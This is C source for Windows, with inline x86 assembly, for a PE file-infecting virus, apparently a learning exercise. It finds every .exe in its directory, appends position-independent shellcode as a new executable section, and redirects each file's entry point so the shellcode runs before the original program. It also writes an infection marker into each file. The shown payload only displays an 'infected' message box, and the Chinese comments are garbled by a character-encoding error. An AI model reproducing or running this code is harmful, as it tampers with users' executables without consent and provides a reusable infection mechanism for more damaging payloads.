#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>

// ��Ⱦ���CQNU
#define SIGNATURE 0x756E7163

// �����ļ����
HANDLE hSourceFile = NULL;
// ����ӳ����
HANDLE hSourceMap = NULL;
// ����ӳ����ͼָ��
LPVOID lpSourceBase = NULL;
// DOSͷ
PIMAGE_DOS_HEADER pDosHeader = NULL;
// PEͷ
PIMAGE_NT_HEADERS pNtHeader = NULL;
// �ڱ�ͷ
PIMAGE_SECTION_HEADER pSectionHeaders = NULL;
// �ڱ�ͷ�ṹ��
IMAGE_SECTION_HEADER imgSection = { 0 };
// Դ������ڵ�
DWORD originalEntryPoint = 0;
// Ŀ�������ڵ�
DWORD targetEntryPoint = 0;

void getSelfFileName(char *selfName, char *filePath);
BOOL isPeFileAndGetPointer();
void addSection(char *szSectionName, int sectionSize);
DWORD alignSize(int size, int alignment);
void addSectionData();
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);
void release();

int originalSectionNumber = 0;
DWORD dwFileAlignment = 0;
DWORD dwSectionAlignment = 0;
PIMAGE_SECTION_HEADER pNewSection = NULL;
// ��Ҫ��ӵĽڵĴ�С
DWORD codeSize = 0;

void main(int argc, char *argv[]) {
	char szSelfName[MAX_PATH] = { 0 };
	getSelfFileName(szSelfName, argv[0]);
	/*
		FindFirstFile��һ����������
			1. c:\\Windows\\System32\\*.dll
				��c:\Windows\System32Ŀ¼�в�������dll�ļ�
			2. *.*
				�ڵ�ǰĿ¼���������ļ�
	*/
	char *szFileName = NULL;
	LPCTSTR lpFileName = "*.exe";
	WIN32_FIND_DATA pNextInfo;
	HANDLE hSearch = FindFirstFile(lpFileName, &pNextInfo);
	if (hSearch == INVALID_HANDLE_VALUE)
	{
		printf("��Ŀ���ļ�!\n");
	}
	else {
		do {
			szFileName = pNextInfo.cFileName;
			if (strcmp(szFileName, szSelfName) == 0)
			{
				continue;
			}
			hSourceFile = CreateFile(szFileName,
				GENERIC_WRITE | GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			hSourceMap = CreateFileMapping(hSourceFile, NULL, PAGE_READWRITE, 0, 0, 0);
			lpSourceBase = MapViewOfFile(hSourceMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);

			BOOL bResult = isPeFileAndGetPointer();
			if (bResult == TRUE)
			{
				BOOL bIsInfected = readSignature(hSourceFile, offsetof(IMAGE_DOS_HEADER, e_cblp), SIGNATURE);
				if (bIsInfected == FALSE)
				{
					// ����ӽ�����,�Ա��ȡ�����С, ������������ֽ��븽�ӵ�ԭPE�ļ���ĩβ
					addSectionData();

					// ����½ڱ�,��Ҫ��������ͽڵĴ�С
					addSection(".test", codeSize);

					// ��ӱ��
					writeSignature(hSourceFile, offsetof(IMAGE_DOS_HEADER, e_cblp), SIGNATURE);
					printf("%s��Ⱦ���!\n", szFileName);
				}
				else
				{
					printf("%s�ѱ���Ⱦ��,����!\n", szFileName);
				}
			}
		} while (FindNextFile(hSearch, &pNextInfo));
		FindClose(hSearch);
	}
	system("pause");
}

/*
�ж��Ƿ�Ϊ��Ч��PE�ļ�
�����Чֱ�ӷ���
�����Ч��ѽ���PE��ʽ��صĽṹ��ָ��Ҳ�õ�
*/
BOOL isPeFileAndGetPointer() {
	BOOL bResult = FALSE;
	// �ж��Ƿ�ΪMZͷ
	pDosHeader = (PIMAGE_DOS_HEADER)lpSourceBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("������DOSͷ\n");
		release();
		return bResult;
	}
	// ����IMAGE_DOS_HEADER�е�e_lfanew��ֵ�õ�PEͷ��λ��
	pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)lpSourceBase + pDosHeader->e_lfanew);
	// �ж��Ƿ�ΪPE\0\0
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("������PEͷ\n");
		release();
		return bResult;
	}
	// ��ȡ�ڱ��λ��,��NT_HEADER�е�&(pNtHeader->OptionalHeader)������SizeOfOptionalHeader���ǽڱ��λ����
	// &(pNtHeader->OptionalHeader):ȡ��OptionalHeader�ڸ��ļ��е�ƫ�Ƶ�ַ
	pSectionHeaders = (PIMAGE_SECTION_HEADER)((DWORD)&(pNtHeader->OptionalHeader)
		+ pNtHeader->FileHeader.SizeOfOptionalHeader);
	bResult = TRUE;
	return bResult;
}
/*
	����½�,��Ҫ��������ͽڵĴ�С(ͨ��GetFileSize()������ȡ)
*/
void addSection(char *szSectionName, int sectionSize) {
	// 1. ��ȡ�ؼ��ֶ�(�ڵ�����,�ļ�����,�ڴ����), �Ѿ���addSectionData�л�ȡ����.
	// 2. ���½ڵ�������д�뵽��ʱ��ͷ��
	pNewSection = pSectionHeaders + originalSectionNumber;
	// 2.1 ��������(����Ϊ8,����һ��0��λ��)
	strncpy(pNewSection->Name, szSectionName, 7);
	// 2.2 �ڵ��ڴ��С
	pNewSection->Misc.VirtualSize = alignSize(sectionSize, dwSectionAlignment);
	// 2.3 �ڵ��ڴ���ʼλ��
	pNewSection->VirtualAddress = pSectionHeaders[originalSectionNumber - 1].VirtualAddress
		+ alignSize(pSectionHeaders[originalSectionNumber - 1].Misc.VirtualSize, dwSectionAlignment);
	// 2.4 �ڵ��ļ���С
	pNewSection->SizeOfRawData = alignSize(sectionSize, dwFileAlignment);
	// 2.5 �ڵ��ļ���ʼλ��
	pNewSection->PointerToRawData = pSectionHeaders[originalSectionNumber - 1].PointerToRawData
		+ alignSize(pSectionHeaders[originalSectionNumber - 1].SizeOfRawData, dwFileAlignment);

	// 3. ����ӳ���С�ʹ����С
	pNtHeader->OptionalHeader.SizeOfImage += alignSize(pNewSection->Misc.VirtualSize, dwSectionAlignment);
	pNtHeader->OptionalHeader.SizeOfCode += alignSize(pNewSection->SizeOfRawData, dwFileAlignment);
	// 4. �޸Ľڵ�����
	pNewSection->Characteristics = 0xE0000060;
	// 5. �޸Ľڵ�����
	pNtHeader->FileHeader.NumberOfSections++;
	/* 
	6. ��һ�������ǰ������ڴ�ӳ���ļ��е���ͼ��һ���ֽڵĵ�ַ���ú������������ﴫ�ݵĵ�ַԲ��Ϊһ��ҳ��߽�ֵ��
	   �ڶ�����������ָ������Ҫˢ�µ��ֽ�����ϵͳ���������������Բ����ʹ���ֽ�������ҳ���������
	   ����ֽ�������0, ����ӳ��Ŀ�ʼ������λ��ˢ�������ļ�
	*/
	FlushViewOfFile(lpSourceBase, 0);
}

/*
	����ô�С�Ƕ�������������,ֱ�ӷ���
	�������,��ȡ��(�������1) x ������
*/
DWORD alignSize(int size, int alignment) {
	if (size % alignment != 0)
	{
		size = (size / alignment + 1) * alignment;
	}
	return size;
}

/*
	�ܽ���Գ�����_asm����:
		1. ջ������16λ����
		2. ���ÿ⺯�����ε�ԭ���ǽ���Ҫ������ַ���������ѹ��ջ��,Ȼ�����������Ӧ�ַ�����ջ�еĵ�ַ��Ϊ����.
			�����Ϊʲôÿ�ζ�������ջ��ѹ���ַ���,��ѹ��ESP��ԭ��
		3. Windows�������ε�˳����,���ҵ���ѹջ
*/
void addSectionData() {
	goto shellend;
	_asm {
	shell:  PUSHAD
			MOV  EAX, DWORD PTR FS : [30H]; FS:[30H]ָ��PEB
			MOV  EAX, DWORD PTR[EAX + 0CH]; ��ȡPEB_LDR_DATA�ṹ��ָ��
			MOV  EAX, DWORD PTR[EAX + 1CH]; ��ȡLDR_MODULE������׽���inInitializeOrderModuleList��Ա��ָ��
			MOV  EAX, DWORD PTR[EAX]; LDR_MODULE����ڶ�������inInitializeOrderModuleList��Ա��ָ��
			MOV  EAX, DWORD PTR[EAX]
			MOV  EAX, DWORD PTR[EAX + 08H]; inInitializeOrderModuleListƫ��8h��õ�Kernel32.dll��ģ���ַ
			MOV  EBP, EAX; ��Kernel32.dllģ���ַ��ַ����kernel��

			MOV  EAX, DWORD PTR[EAX + 3CH]; ָ��IMAGE_NT_HEADERS
			MOV  EAX, DWORD PTR[EBP + EAX + 78H]; ָ�򵼳���
			MOV  ECX, [EBP + EAX + 18H]; ȡ�������е����������ֵ���Ŀ
			MOV  EBX, [EBP + EAX + 20H]; ȡ�����������ֱ�ĵ�ַ
			ADD  EBX, EBP

			PUSH WORD  PTR 0X00; ����GetProcAddress�ַ���
			PUSH DWORD PTR 0X73736572
			PUSH DWORD PTR 0X64644163
			PUSH DWORD PTR 0X6F725074
			PUSH WORD PTR 0X6547
			MOV  EDX, ESP
			PUSH ECX

			F1 :
			MOV  EDI, EDX
				POP  ECX
				DEC  ECX
				TEST  ECX, ECX
				JZ  EXIT
				MOV  ESI, [EBX + ECX * 4]
				ADD  ESI, EBP
				PUSH  ECX
				MOV  ECX, 15
				REPZ  CMPSB
				TEST  ECX, ECX
				JNZ  F1

				POP  ECX
				MOV  ESI, [EBP + EAX + 36]; ȡ�õ���������ű�ĵ�ַ
				ADD  ESI, EBP
				MOVZX  ESI, WORD PTR[ESI + ECX * 2]; ȡ�ý��뺯����ַ������
				MOV  EDI, [EBP + EAX + 28]; ȡ�ú�����ַ��ĵ�ַ
				ADD  EDI, EBP
				; 1. ȡ��GetProcAddress�����ĵ�ַ
				MOV  EDI, [EDI + ESI * 4]
				; GetProcAddress�����ĵ�ַ������EDI����
				ADD  EDI, EBP

				PUSH WORD PTR 0X00; ����LoadLibraryA�ַ���
				PUSH DWORD PTR 0X41797261
				PUSH DWORD PTR 0X7262694C
				PUSH DWORD PTR 0X64616F4C
				; ����һ: �ַ���������ջ�еĵ�ַ
				PUSH ESP
				; ������: kernelģ��ĵ�ַ�����EBP��
				PUSH EBP
				; 2. ����GetProcAddressȡ��LoadLibraryA�����ĵ�ַ
				CALL EDI

				; �Լ���ӵĴ���: call֮��LoadLibraryA�����ĵ�ַ������EAX����, �ȱ��浽ESI����, ������汻����
				MOV ESI, EAX

				; ���ݱ������, ���ݵ��ַ�������������DWORDΪ��λ����, Ȼ���ٴ���һ��WORD��С�Ľ�����\0
				PUSH WORD PTR 0x0000
				PUSH DWORD PTR 0X00003233; ��Ӳ�����user32���ַ���(75 73 65 72 33 32)
				PUSH DWORD PTR 0X72657375
				PUSH ESP
				; 3. ����LoadLibraryA����ȡ��user32.dllģ��ĵ�ַ
				CALL ESI

				PUSH WORD PTR 0X00; ����MessageBoxA�ַ���(4D657373 61676542 6F7841)
				PUSH DWORD PTR 0X0041786F
				PUSH DWORD PTR 0X42656761
				PUSH DWORD PTR 0X7373654D
				PUSH ESP
				; ��user32ģ����Ϊ�ڶ�������ѹջ���ݽ�ȥ
				PUSH EAX
				CALL EDI; ����GetProcAddressȡ��MessageBoxA�����ĵ�ַ

				; ����user32�е�MessageBoxA����
				/*
					����:
					1. �Ƚ���Ҫ�������ַ���ȫ��ѹ��ջ��
					2. ��¼�µ�ǰջ���ĵ�ַ,����������ÿ���ַ�����ʼ�ĵ�ַ
					3. ���ҵ����뺯������Ҫ�Ĳ���

					// 5045cec4 bcfeb8d0 c8be0000
					// "PE�ļ���Ⱦ"
					// b8c3cec4 bcfed2d1 b1bbb8d0 c8be0000
					// "���ļ��ѱ���Ⱦ"
				*/
				PUSH  DWORD PTR 0X0000BEC8
				PUSH  DWORD PTR 0XD0B8BBB1
				PUSH  DWORD PTR 0XD1D2FEBC
				PUSH  DWORD PTR 0XC4CEC3B8; ��Ӳ��������ļ��ѱ���Ⱦ���ַ���(b8c3cec4 bcfed2d1 b1bbb8d0 c8be0000)
				PUSH  DWORD PTR 0X0000BEC8
				PUSH  DWORD PTR 0XD0B8FEBC
				PUSH  DWORD PTR 0XC4CE4550; ��Ӳ�����PE�ļ���Ⱦ���ַ���(5045cec4 bcfeb8d0 c8be0000)
				MOV EBX, ESP
				PUSH  DWORD PTR 0X00; �����Ի�������
				PUSH EBX
				ADD EBX, 12
				PUSH EBX
				PUSH  DWORD PTR 0X00; ����NULL
				CALL  EAX

				EXIT : ADD ESP, 82; ƽ���ջ, ����������ƽջǰ�����һ����ô��봦��ESP��ȥPUSHAD����ĵ�һ������ESP
				POPAD
	}
shellend:
	{
		char*	pShell;
		int		nShellLen;
		BYTE	jmp = 0xE9;
		__asm
		{
			LEA EAX, shell
			MOV pShell, EAX;
			LEA EBX, shellend
				SUB EBX, EAX
				MOV nShellLen, EBX
		}
		// ��ȡ�ؼ��ֶ�(�ڵ�����,�ļ�����,�ڴ����)
		originalSectionNumber = pNtHeader->FileHeader.NumberOfSections;
		dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
		dwSectionAlignment = pNtHeader->OptionalHeader.SectionAlignment;
		// �������С��ֵ��ȫ�ֱ���,����ʹ�÷���ֵ.
		codeSize = nShellLen;

		// д��SHELLCODE
		DWORD dwNumber = 0;
		SetFilePointer(hSourceFile, 0, 0, FILE_END);
		WriteFile(hSourceFile, pShell, nShellLen, &dwNumber, NULL);
		
		// ��ȡ������Դ������ڵ�ַ
		originalEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
		// �����µĳ�����ڵ�ַ
		pNtHeader->OptionalHeader.AddressOfEntryPoint =
		pSectionHeaders[originalSectionNumber - 1].VirtualAddress
		+ alignSize(pSectionHeaders[originalSectionNumber - 1].Misc.VirtualSize, dwSectionAlignment);

		// SHELLCODE֮������ת��ԭOEP��ָ��
		pNewSection = pSectionHeaders + originalSectionNumber;
		pNewSection->VirtualAddress = pSectionHeaders[originalSectionNumber - 1].VirtualAddress
			+ alignSize(pSectionHeaders[originalSectionNumber - 1].Misc.VirtualSize, 
				dwSectionAlignment);
		/*
			E9ָ���Ƕμ����ת��ָ��,ռ5���ֽ�,�����������Ե�ǰָ�����һ��ָ��ĵ�ַ��ƫ����
			Ŀ���ַ�ļ��㹫ʽΪ:��ָ���е�ƫ��ֵ + ��ת��ָ�����һ��ָ��ĵ�ַ
			ƫ���� = Ŀ���ַ - (ת��ָ�����ڵ�ַ + 5)
		*/
		originalEntryPoint = originalEntryPoint - (pNewSection->VirtualAddress + nShellLen) - 5;
		WriteFile(hSourceFile, &jmp, sizeof(jmp), &dwNumber, NULL);
		WriteFile(hSourceFile, &originalEntryPoint, sizeof(originalEntryPoint), &dwNumber, NULL);
		// ���0����Ӧ�ļ�����
		int fillLength = dwFileAlignment - nShellLen - sizeof(jmp) - sizeof(originalEntryPoint);
		char *tempValue = calloc(fillLength, sizeof(char));
		WriteFile(hSourceFile, tempValue, fillLength, &dwNumber, NULL);
		free(tempValue);
		FlushFileBuffers(hSourceFile);
	}
}
/*
��ָ���ļ���ָ��λ����д���Ⱦ��־
*/
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	return WriteFile(hFile, &dwSignature, sizeof(DWORD), &dwNumber, NULL);
}
/*
��ȡָ���ļ�ָ��λ���ϵĸ�Ⱦ��־
*/
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD signatureToRead = 0;
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	ReadFile(hFile, &signatureToRead, sizeof(DWORD), &dwNumber, NULL);
	return signatureToRead == dwSignature;
}
/*
	��ָ���ļ�·���зָ���ļ���
*/
void getSelfFileName(char *selfName, char *filePath) {
	char *p = filePath;
	int lastIndex = 0;
	int i = 0;
	while (*p != '\0')
	{
		if (*p == '\\')
		{
			lastIndex = i;
		}
		p++;
		i++;
	}
	// ������ǰ��'\'
	lastIndex++;
	p = filePath + lastIndex;
	i = 0;
	while (*p != '\0')
	{
		*(selfName + i) = *p;
		i++;
		p++;
	}
}

/*
	�ͷ���Դ
*/
void release() {
	UnmapViewOfFile(lpSourceBase);
	CloseHandle(hSourceMap);
	CloseHandle(hSourceFile);
}
